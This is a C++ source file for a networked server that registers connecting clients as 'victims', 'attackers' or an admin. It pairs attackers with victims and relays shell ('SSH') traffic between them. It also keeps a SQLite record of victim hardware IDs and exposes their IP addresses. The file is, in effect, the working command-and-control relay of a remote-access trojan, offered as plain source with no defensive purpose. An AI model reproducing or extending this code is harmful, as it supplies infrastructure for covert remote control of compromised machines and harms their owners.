#include "server.hpp"
#include "../commands.hpp"

#include <exception>
#include <fstream>
#include <sstream>

Server::Server()
{
	int state = initializeDatabase();
	if (state == -1) {
		printLog("failed to open database");
		std::exit(-1);
	}
	printLog("");
	printLog("loaded " + std::to_string(state) + " hId datapoint(s) from file");

	if (listener.listen(443) != sf::Socket::Status::Done) {
		printLog("failed to listen on port 443");
		std::exit(-1);
	}
	selector.add(listener);
	
	try {
		const auto& pub = sf::IpAddress::getPublicAddress();
		const auto& priv = sf::IpAddress::getLocalAddress();
		const auto& port = std::to_string(listener.getLocalPort());
		printLog("listening on port " + port + " (" + 
			priv.value().toString() + " / " + pub.value().toString() + ")");
	}
	catch (std::exception& e) {
		printLog(e.what());
		std::exit(-2);
	}
	
	lastAwakeCheckTime = std::chrono::duration_cast<std::chrono::seconds>(
		std::chrono::system_clock::now().time_since_epoch()).count();
}

int Server::processIncoming()
{
	//disconnect inactive clients
	bool needSendClientList = false;
	try {
		size_t now = std::chrono::duration_cast<std::chrono::seconds>(
			std::chrono::system_clock::now().time_since_epoch()).count();

		if (now - lastAwakeCheckTime > 10) {
			needSendClientList = performAwakeCheck();
			lastAwakeCheckTime = now;
		}
	}
	catch (std::exception& e) {
		printLog("awake checks: " + std::string(e.what()));
	}

	//wait for the selector to be ready
	if (!selector.wait(sf::seconds(1))) {
		sf::sleep(sf::milliseconds(1000));

		if (needSendClientList)
			sendClientList();

		return 0;
	}

	//listen for incoming connections
	try {
		if (selector.isReady(listener))
			acceptIncoming();
	}
	catch (std::exception& e) {
		printLog("accept incoming: " + std::string(e.what()));
	}

	//listen for client communication
	std::set<std::string> bannedHIds;
	std::set<uint16_t> idsToDisconnect;
	try {
		for (auto& [id, c] : clients) {
			if (!selector.isReady(*c.socket))
				continue;

			handleCommunication(id, c, bannedHIds, idsToDisconnect);
		}
	}
	catch (std::exception& e) {
		printLog("handle communication: " + std::string(e.what()));
	}

	//listen for initialization attempts
	try {
		for (size_t i = 0; i < uninitialized.size(); ) {
			if (!selector.isReady(*uninitialized[i].socket)) {
				++i;
				continue;
			}

			auto status = initializeClient(uninitialized[i]);
			if (!status.first) {
				++i;
				continue;
			}

			if (status.second != 0)
				clients[status.second] = std::move(uninitialized[i]);
			else {
				selector.remove(*uninitialized[i].socket);
				delete uninitialized[i].socket;
			}

			uninitialized.erase(uninitialized.begin() + i);
			needSendClientList = true;
		}
	}
	catch (std::exception& e) {
		printLog("initialize clients: " + std::string(e.what()));
	}
	
	//disconnect/ban all clients that need to
	try {
		//add banned clients to the kill list
		for (const auto& hId : bannedHIds) {
			for (auto& [id, c] : clients) {
				//check if client needs to be killed
				if (c.hId == hId && c.isAttacker && !c.isAdmin) {
					printLog("attacker banned (" + std::to_string(id) + ")");
					idsToDisconnect.insert(id);
				}
			}
		}
		//kill all the clients that need to
		for (const auto& id : idsToDisconnect)
			disconnectClient(id);
	}
	catch (std::exception& e) {
		printLog("clients disconnect: " + std::string(e.what()));
	}		

	if (bannedHIds.size() > 0 || idsToDisconnect.size() > 0 || needSendClientList)
		sendClientList();

	return 0;
}

bool Server::performAwakeCheck()
{
	std::set<uint16_t> idsSleeping;
	for (auto& [id, c] : clients) {
		if (!c.isAwake)
			idsSleeping.insert(id);
		else
			c.isAwake = false;
	}
	for (auto id : idsSleeping) {
		printLog("client timed out (" + std::to_string(id) + ")");
		disconnectClient(id);
	}

	for (size_t i = 0; i < uninitialized.size(); ) {
		if (!uninitialized[i].isAwake) {
			selector.remove(*uninitialized[i].socket);
			delete uninitialized[i].socket;
			uninitialized.erase(uninitialized.begin() + i);
		}
		else {
			uninitialized[i].isAwake = false;
			i++;
		}
	}

	return !idsSleeping.empty();
}
void Server::acceptIncoming()
{
	Client c;
	c.socket = new sf::TcpSocket();

	//client accepted successfully
	if (listener.accept(*c.socket) == sf::Socket::Status::Done) {
		uninitialized.push_back(c);
		selector.add(*c.socket);

		printLog("new connection = " +
			c.socket->getRemoteAddress().value().toString() + 
			":" + std::to_string(c.socket->getRemotePort()), true);
	}
	//failed to accept client 
	else
		delete c.socket;
}
void Server::handleCommunication(const uint16_t& id, Client& c,
	std::set<std::string>& bannedHIds, std::set<uint16_t>& idsToDisconnect)
{
	sf::Packet p;
	auto status = c.socket->receive(p);
	//forget disconnected client
	if (status == sf::Socket::Status::Disconnected) {
		printLog("handleCommunication: client disconnected (" + std::to_string(id) + ")");
		idsToDisconnect.insert(id);
		return;
	}
	else if (status != sf::Socket::Status::Done) {
		printLog("code " + std::to_string(int(status)));
		return;
	}

	auto cmd = handlePacket(p, id, c, bannedHIds, idsToDisconnect);
	if (cmd != 0)
		printLog("handleCommunication: failed to process cmd " + std::to_string(cmd) + " from id " + std::to_string(id));
	else
		c.isAwake = true;

}
//bool = whether full packet was received, uint16_t = 0 if error, else id assigned
std::pair<bool, uint16_t> Server::initializeClient(Client& u)
{
	sf::Packet p;
	u.socket->setBlocking(false);
	auto status = u.socket->receive(p);
	u.socket->setBlocking(true);

	if (status == sf::Socket::Status::Partial)
		return std::pair<bool, uint16_t>(false, 0);
	if (status != sf::Socket::Status::Done)
		return std::pair<bool, uint16_t>(true, 0);

	std::uint16_t reqId;
	std::uint8_t cmd;
	std::string ver, hId;
	p >> reqId >> cmd >> ver >> hId;

	u.isAwake = true;
	bool isRouge = false;
	if (ver.size() < 3 || hId.size() != 40)
		isRouge = true;
	else if (ver[0] != '#' || ver.back() != '#')
		isRouge = true;
	if (isRouge) {
		printLog("uninitialized client gone rogue", true);
		return std::pair<bool, uint16_t>(true, 0);
	}

	//TODO: handle client version

	if (database.find(hId) == database.end())
		database[hId] = HIdInfo();

	sqlite3_stmt* stmt;
	sqlite3_prepare_v2(db, "INSERT INTO clients (hId, name, isBanned) VALUES (?, '', 0);", -1, &stmt, nullptr);
	sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
	sqlite3_step(stmt);
	sqlite3_finalize(stmt);

	//accept admin
	if (cmd == std::uint8_t(Cmd::REGISTER_ADMIN)) {
		std::string pw;
		p >> pw;

		//password is correct
		if (pw == adminPassword) {
			auto id = nextId++;
			sf::Packet res;
			res << reqId << bool(true) << uint16_t(id);
			auto _ = u.socket->send(res);

			u.isAttacker = true, u.isAdmin = true, u.hId = hId;

			printLog(std::to_string(id) + " = admin: " + hId);
			return std::pair<bool, uint16_t>(true, id);
		}
		//password is not correct
		else {
			sf::Packet res;
			res << reqId << bool(false);
			auto _ = u.socket->send(res);

			printLog(hId + ", failed admin login");
			return std::pair<bool, uint16_t>(true, 0);
		}
	}
	//accept attacker
	else if (cmd == std::uint8_t(Cmd::REGISTER_ATTACKER)) {
		//access granted
		if (!database[hId].isBanned) {
			auto id = nextId++;
			sf::Packet res;
			res << reqId << bool(true) << uint16_t(id);
			auto _ = u.socket->send(res);

			u.isAttacker = true, u.hId = hId;

			printLog(std::to_string(id) + " = attacker: " + hId);
			return std::pair<bool, uint16_t>(true, id);
		}		
		//client is banned (access denied)
		else {
			sf::Packet res;
			res << reqId << bool(false);
			auto _ = u.socket->send(res);

			printLog("banned client: " + hId);
			return std::pair<bool, uint16_t>(true, 0);
		}
	}
	//accept victim
	else if (cmd == std::uint8_t(Cmd::REGISTER_VICTIM)) {
		auto id = nextId++;
		sf::Packet res;
		res << reqId << bool(true) << uint16_t(id);
		auto _ = u.socket->send(res);

		u.isAttacker = false, u.hId = hId;

		printLog(std::to_string(id) + " = victim: " + hId);
		return std::pair<bool, uint16_t>(true, id);
	}
	//unknown first command
	else {
		printLog("uninitialized client gone rogue");
		return std::pair<bool, uint16_t>(true, 0);
	}
}

uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
	std::set<std::string>& bannedHIds, std::set<uint16_t>& idsToDisconnect)
{
	uint16_t reqId;
	uint8_t cmd;
	p >> reqId >> cmd;

	if (cmd == uint8_t(Cmd::PING))
		return 0;
	//stop ssh
	else if (cmd == uint8_t(Cmd::END_SSH)) {
		//not paired or invalid pairing
		if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
			return cmd;

		sf::Packet res;
		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
		auto _ = clients[c.sshId].socket->send(res);

		//defensive check that peer still exists
		if (clients.find(c.sshId) != clients.end())
			clients[c.sshId].sshId = 0;
		c.sshId = 0;
		return 0;
	}
	//send ssh data
	else if (cmd >= uint8_t(Cmd::SSH_DATA) && cmd < uint8_t(Cmd::SSH_DATA + 50)) {
		if (c.sshId == 0 || clients.find(c.sshId) == clients.end()) {
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::END_SSH);
			auto _ = c.socket->send(res);
			return cmd;
		}

		auto _ = clients[c.sshId].socket->send(p);
		return 0;
	}

	if (!c.isAttacker)
		return cmd;

	//change client name
	if (cmd == uint8_t(Cmd::CHANGE_NAME)) {
		std::string hId, name;
		p >> hId >> name;
		if (c.isAdmin && database.find(hId) != database.end()) {
			database[hId].name = name;
			
			sqlite3_stmt* stmt;
			sqlite3_prepare_v2(db, "UPDATE clients SET name = ? WHERE hId = ?;", -1, &stmt, nullptr);
			sqlite3_bind_text(stmt, 1, name.c_str(), -1, SQLITE_TRANSIENT);
			sqlite3_bind_text(stmt, 2, hId.c_str(), -1, SQLITE_TRANSIENT);
			sqlite3_step(stmt);
			sqlite3_finalize(stmt);

			sendClientList();
		}
	}
	//ban client
	else if (cmd == uint8_t(Cmd::BAN_HID)) {
		std::string hId;
		p >> hId;

		if (c.isAdmin && database.find(hId) != database.end()) {
			if (!database[hId].isBanned) {
				database[hId].isBanned = true;
				
				sqlite3_stmt* stmt;
				sqlite3_prepare_v2(db, "UPDATE clients SET isBanned = 1 WHERE hId = ?;", -1, &stmt, nullptr);
				sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
				sqlite3_step(stmt);
				sqlite3_finalize(stmt);

				bannedHIds.insert(hId);
			}
		}
	}
	//unban client
	else if (cmd == uint8_t(Cmd::UNBAN_HID)) {
		std::string hId;
		p >> hId;

		if (c.isAdmin && database.find(hId) != database.end()) {
			if (database[hId].isBanned) {
				database[hId].isBanned = false;
				
				sqlite3_stmt* stmt;
				sqlite3_prepare_v2(db, "UPDATE clients SET isBanned = 0 WHERE hId = ?;", -1, &stmt, nullptr);
				sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
				sqlite3_step(stmt);
				sqlite3_finalize(stmt);

				sendClientList();
			}
		}
	}
	//kill client
	else if (cmd == uint8_t(Cmd::KILL)) {
		uint16_t targetId;
		p >> targetId;

		// only admins may kill non-admin clients; mark for disconnect
		if (c.isAdmin && clients.find(targetId) != clients.end() && !clients[targetId].isAdmin) {
			printLog("client killed (" + std::to_string(targetId) + ")");
			// mark for removal later by processIncoming
			idsToDisconnect.insert(targetId);
		}
	}
	//start ssh
	else if (cmd == uint8_t(Cmd::START_SSH)) {
		uint16_t oId;
		p >> oId;
		//1 = success, 2 = already paired, 3 = invalid id
		//4 = other id already paired
		uint8_t code = uint8_t(0);

		//this client is already paired
		if (c.sshId != 0)
			code = uint8_t(2);
		else if (id == oId)
			code = uint8_t(3);
		//check if the client exists
		else if (clients.find(oId) != clients.end()) {
			if (clients[oId].isAttacker)
				code = uint8_t(3);
			//other client is already paired
			else if (clients[oId].sshId != 0)
				code = uint8_t(4);
			else {
				clients[oId].sshId = id;
				c.sshId = oId;
				code = uint8_t(1);
			}
		}
		else
			code = uint8_t(3);

		sf::Packet res;
		res << reqId << code;
		auto _ = c.socket->send(res);

		if (code == uint8_t(1)) {
			res.clear();
			res << uint16_t(0) << uint8_t(Cmd::START_SSH);
			_ = clients[oId].socket->send(res);
		}
	}
	//unkown command
	else {
		printLog("unknown command (" + std::to_string(id)
			+ "): " + std::to_string(int(cmd)));
	}

	return 0;
}

void Server::sendClientList() const
{
	sf::Packet admPacket, attPacket;
	admPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(database.size());
	attPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(0);

	for (const auto& [hId, info] : database)
		admPacket << hId << info.name << info.isBanned;

	admPacket << uint16_t(clients.size());
	attPacket << uint16_t(clients.size());

	for (const auto& [id, c] : clients) {
		std::string ip = c.socket->getRemoteAddress().value().toString() 
			+ ":" + std::to_string(c.socket->getRemotePort());

		admPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
		attPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
	}

	for (const auto& [id, c] : clients) {
		if (c.isAdmin)
			auto _ = c.socket->send(admPacket);
		else if (c.isAttacker)
			auto _ = c.socket->send(attPacket);
	}
}
void Server::disconnectClient(uint16_t id)
{
	auto it = clients.find(id);
	if (it == clients.end()) {
		printLog("disconnectClient: client not found (" + std::to_string(id) + ")");
		return;
	}

	//notify paired client about the disconnection
	if (it->second.sshId != 0) {
		auto peerIt = clients.find(it->second.sshId);
		if (peerIt != clients.end()) {
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::END_SSH);
			//try to send; ignore result but log failure
			if (peerIt->second.socket->send(res) != sf::Socket::Status::Done)
				printLog("failed sending END_SSH to paired client (" + std::to_string(peerIt->first) + ")");
			peerIt->second.sshId = 0;
		}
	}

	if (it->second.socket != nullptr) {
		selector.remove(*it->second.socket);
		it->second.socket->disconnect();
		delete it->second.socket;
		it->second.socket = nullptr;
	}

	clients.erase(it);
}

int Server::initializeDatabase()
{
	int rc = sqlite3_open(databasePath.c_str(), &db);
	if (rc) {
		printLog("can't open database: " + std::string(sqlite3_errmsg(db)));
		return -1;
	}

	sqlite3_exec(db, "PRAGMA synchronous = FULL;", nullptr, nullptr, nullptr);

	//if not table exixts, create a teble with hId (str), name (str), isBanned (bool)
	const char* sql1 = "CREATE TABLE IF NOT EXISTS clients (hId TEXT PRIMARY KEY, name TEXT, isBanned INTEGER);";
	char* errMsg = nullptr;
	rc = sqlite3_exec(db, sql1, nullptr, nullptr, &errMsg);
	if (rc != SQLITE_OK) {
		printLog("SQL error: " + std::string(errMsg));
		sqlite3_free(errMsg);
		return -1;
	}

	//extract data and populate in-memory database
	int num = 0;
	const char* sql2 = "SELECT hId, name, isBanned FROM clients;";
	sqlite3_stmt* stmt;

	if (sqlite3_prepare_v2(db, sql2, -1, &stmt, nullptr) != SQLITE_OK) {
		printLog("SELECT prepare failed: " + std::string(sqlite3_errmsg(db)));
		return -1;
	}

	while (sqlite3_step(stmt) == SQLITE_ROW) {
		HIdInfo hIdInfo;
		auto cstr1 = sqlite3_column_text(stmt, 0);
		std::string hId = cstr1 ? reinterpret_cast<const char*>(cstr1) : "";

		auto cstr2 = sqlite3_column_text(stmt, 1);
		hIdInfo.name = cstr2 ? reinterpret_cast<const char*>(cstr2) : "";

		hIdInfo.isBanned = sqlite3_column_int(stmt, 2);

		database[hId] = hIdInfo;
		num++;
	}
	sqlite3_finalize(stmt);

	return num;
}
